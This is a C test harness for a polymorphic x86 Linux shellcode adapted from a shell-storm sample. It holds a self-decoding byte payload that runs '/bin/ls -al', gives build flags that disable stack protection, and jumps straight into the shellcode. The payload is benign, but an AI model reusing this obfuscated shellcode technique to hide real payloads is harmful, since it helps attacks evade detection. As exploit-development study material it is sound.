#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
// Author: Chase Hatch 
// modified:  http://shell-storm.org/shellcode/files/shellcode-216.php

char boron[]=\
"\xda\xd5\xd9\x74\x24\xf4\x5f\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xbb\x13\x13\x13\x13\x51\x66\x29\x5f\x2c\x66\x01\x5f\x33\x29\x5f\x39\x01\x5f\x3e\x29\x5f\x48\xeb\x23\x5f\x66\x68\x1e\x13\x58\x99\x52\x66\x68\x1a\x50\x89\xe6\x52\x68\x42\x42\x86\x7b\x68\x1c\x4f\x56\x5b\x89\xe3\x52\x57\x56\x53\x9c\xf4\xe0\x93\xe8\xd8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6c\x73\x20\x2d\x61\x6c\x20\x2e\x3b\x65\x78\x69\x74\x3b";
// gcc 216_modded.c -o 216_modded.elf -fno-stack-protector -z execstack
// strip --strip-debug --strip-unneeded 216_modded.elf
// cmd = /bin/ls -al .;exit;   // 19 bytes 
// polymorphic execution stub: 100 bytes - 19 = 89 bytes
// total length 100 bytes

 
int main(int argc, char **argv){
	printf("[#] len: %d\n", strlen(boron));
	(* (int (*)())boron)();
	exit(0);
}
